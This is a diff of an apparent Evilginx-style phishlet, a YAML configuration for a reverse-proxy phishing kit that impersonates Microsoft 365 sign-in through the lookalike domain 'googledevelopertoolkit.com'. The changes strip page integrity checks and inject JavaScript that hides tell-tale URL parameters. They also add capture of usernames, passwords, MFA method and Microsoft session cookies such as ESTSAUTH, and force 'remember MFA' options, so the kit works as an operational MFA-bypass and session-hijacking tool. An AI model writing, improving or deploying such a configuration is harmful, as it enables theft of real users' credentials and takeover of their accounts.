@@ -1,6 +1,6 @@
-name: 'o365'
-author: '@APT29'
-min_ver: '2.4.0'
+name: 'Microsoft 365'
+author: 'Jan Bakker'
+min_ver: '3.1.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
@@ -8,78 +8,108 @@ proxy_hosts:
   - {phish_sub: 'cloud', orig_sub: 'cloud', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'mysignins', orig_sub: 'mysignins', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true, is_landing:false}
 
 custom_headers:
-      - {name: 'Access-Control-Allow-Origin', value: 'https://login.googledevelopertoolkit.com', direction: 'response'}
-      - {name: 'Access-Control-Allow-Methods', value: 'GET, POST', direction: 'response'}
-      - {name: 'Access-Control-Allow-Headers', value: 'Content-Type', direction: 'response'}
-      - {name: 'Access-Control-Allow-Credentials', value: 'true', direction: 'response'}
-  
+  - {name: 'Access-Control-Allow-Origin', value: 'https://login.googledevelopertoolkit.com', direction: 'response'}
+  - {name: 'Access-Control-Allow-Methods', value: 'GET, POST', direction: 'response'}
+  - {name: 'Access-Control-Allow-Headers', value: 'Content-Type', direction: 'response'}
+  - {name: 'Access-Control-Allow-Credentials', value: 'true', direction: 'response'}
+
 sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'login.googledevelopertoolkit.com', orig_sub: 'login', domain: 'googledevelopertoolkit.com', search: 'integrity="sha384-[^"]*"', replace: '', mimes: ['text/html', 'application/javascript']}
-  - {triggers_on: 'login.googledevelopertoolkit.com', orig_sub: 'login', domain: 'googledevelopertoolkit.com', search: 'crossorigin="https://login.googledevelopertoolkit.com"', replace: '', mimes: ['text/html', 'application/javascript']}
+- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="sha384-[^"]*"', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript']}
+- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'crossorigin="https://{hostname}"', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript']}
+- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+js_inject:
+  - trigger_domains: ['login.microsoftonline.com', 'login.googledevelopertoolkit.com']
+    # FIXED: Added a universal wildcard regex catch-all for both endpoint roots
+    trigger_paths: 
+      - '/common/oauth2/v2.0/authorize'
+      - '/common/oauth2/.*'
+      - '/organizations/oauth2/v2.0/authorize'
+      - '/organizations/oauth2/.*'
+      - '/organizations/.*'
+      - '/'
+      - '/\?auth=.*'
+    script: |
+      function disguiseURL() {
+        let url = new URL(window.location.href);
+        let modified = false;
+
+        // 1. Safe guard check: Ensure the page layout has initialized
+        if (!document.getElementById('i0116') && !document.querySelector('input[type="email"]')) {
+          return; 
+        }
+        
+        // 2. Clear out client_id from view
+        if (url.searchParams.has('client_id')) {
+          url.searchParams.delete('client_id');
+          modified = true;
+        }
+        
+        // 3. Keep the custom 'boop' value locked into place
+        if (!url.searchParams.has('boop')) {
+          url.searchParams.set('boop', 'session_' + Math.random().toString(36).substring(2, 10));
+          modified = true;
+        }
+        
+        // 4. Push the cleaned parameter string into the browser address bar
+        if (modified) {
+          window.history.replaceState({}, document.title, url.pathname + url.search);
+        }
+      }
+
+      // Execute safely using a rapid cycle to capture early framework rendering
+      setTimeout(disguiseURL, 200);
+      setInterval(disguiseURL, 200);
+
 
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
-  - domain: 'login.microsoftonline.com'
-    keys: ['SignInStateCookie']      
-
-
-# INJECT COOKIES
-# --------------
-# 
-# Browse the url https://login.microsoftonline.com
-# inject the capture cookies 
-# Refresh the browser
-
-
-
+    keys: ['ESTSWCTXFLOWTOKEN:always', 'ESTSAUTH:always', 'ESTSAUTHPERSISTENT:always', 'SignInStateCookie:always', 'CCState:always', 'esctx:always']
+    type: 'cookie'
+  # 2. Workspace Domain Cookies
+  - domain: '.office.com'
+    keys: ['Spsid', 'OIDC']
+    type: 'cookie'
+    
+  # 3. Modern Cloud Infrastructure Target (Added for cloud.microsoft compatibility)
+  - domain: '.cloud.microsoft'
+    keys: ['EdgeAccessCookie', 'M365Session']
+    type: 'cookie'
 credentials:
   username:
-    key: 'login'
+    key: '(login|UserName)'
     search: '(.*)'
     type: 'post'
   password:
-    key: 'passwd'
+    key: '(passwd|Password|accesspass)'
     search: '(.*)'
-    type: 'post'     
+    type: 'post'
+  custom:
+    - key: 'mfaAuthMethod'
+      search: '(.*)'
+      type: 'post'
 auth_urls:
   - '/common/SAS/ProcessAuth'
   - '/kmsi'
 login:
   domain: 'login.microsoftonline.com'
-  path: '/' 
+  path: '/organizations/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fm365.cloud.microsoft%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&sso_reload=true'
 force_post:
   - path: '/kmsi'
-    search: 
+    search:
       - {key: 'LoginOptions', search: '.*'}
     force:
       - {key: 'LoginOptions', value: '1'}
     type: 'post'
   - path: '/common/SAS'
-    search: 
+    search:
       - {key: 'rememberMFA', search: '.*'}
     force:
       - {key: 'rememberMFA', value: 'true'}
     type: 'post'
-  - path: '/kmsi'
-    search: 
-      - {key: 'rememberMFA', search: '.*'}
-    force:
-      - {key: 'rememberMFA', value: 'true'}
-    type: 'post'
-
-rewrite_urls:
-  - trigger:
-        domains: ['login.microsoftonline.com']
-        paths: ['/common/oauth2/v2.0/authorize']
-    rewrite:
-        path: '/signin'
-        query:
-          - key: 'boop'
-            value: '{id}'
-        exclude_keys: ['client_id']
